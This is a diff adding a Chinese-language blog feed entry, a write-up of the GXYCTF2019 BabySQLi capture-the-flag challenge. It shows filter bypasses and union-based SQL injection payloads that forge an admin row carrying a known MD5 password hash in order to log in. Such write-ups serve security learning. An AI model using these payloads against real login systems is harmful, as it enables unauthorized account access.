@@ -4,6 +4,37 @@
   
   
   <entry>
+    <title>[ctf-web] GXYCTF2019-BabySQLi</title>
+    <link href="/2022/12/11/%5Bctf-web%5D%20GXYCTF2019-BabySQLi/"/>
+    <url>/2022/12/11/%5Bctf-web%5D%20GXYCTF2019-BabySQLi/</url>
+    
+    <content type="html"><![CDATA[<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>进入就是登录界面，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221211214837774.png" alt="image-20221211214837774"></p><p>尝试之后，在源码页面发现提示，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221211214910324.png" alt="image-20221211214910324"></p><p>先用base32解码，然后base64解码，</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;$name&#x27;</span><br></code></pre></td></tr></table></figure><p>接下来尝试，发现过滤了<code>or</code>，<code>=</code>，<code>()</code>，<code>or</code>可以使用<code>Or</code>绕过，<code>=</code>可以用<code>&lt;&gt;</code>绕过，<code>()</code>倒是没想到什么好的办法，使用</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">admin</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p>确定了有3列，之后就不会了。</p><p>使用的是虚拟表（大概），使用这样的语句：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,md5(<span class="hljs-string">&#x27;abc&#x27;</span>);<br></code></pre></td></tr></table></figure><p>返回结果为：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/20163356-f177be36d62355a1.png" alt="img"></p><p>意味着联合查询会构造一个虚拟表，这个表中的数据并没有保存，只是临时存在的，所以如果构造这样的语句：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">xx&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-symbol">&#x27;admin</span><span class="hljs-string">&#x27;,&#x27;</span>c4ca4238a0b923820dcc509a6f75849b&#x27;#<br></code></pre></td></tr></table></figure><p>这里<code>c4ca4238a0b923820dcc509a6f75849b</code>是<code>MD5(1)</code>的值，密码使用<code>1</code>，就可以登录成功了。</p><p>[<a href="https://www.jianshu.com/p/6fd932f883cd">GXYCTF2019] BabySQli WriteUp - 简书 (jianshu.com)</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>sql注入</category>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>sql注入</tag>
+      
+      <tag>ctf</tag>
+      
+      <tag>ctf-web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>[ctf-web] 网鼎杯2020青龙组-AreUSerialz</title>
     <link href="/2022/12/08/%5Bctf-web%5D%20%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUserialz/"/>
     <url>/2022/12/08/%5Bctf-web%5D%20%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUserialz/</url>
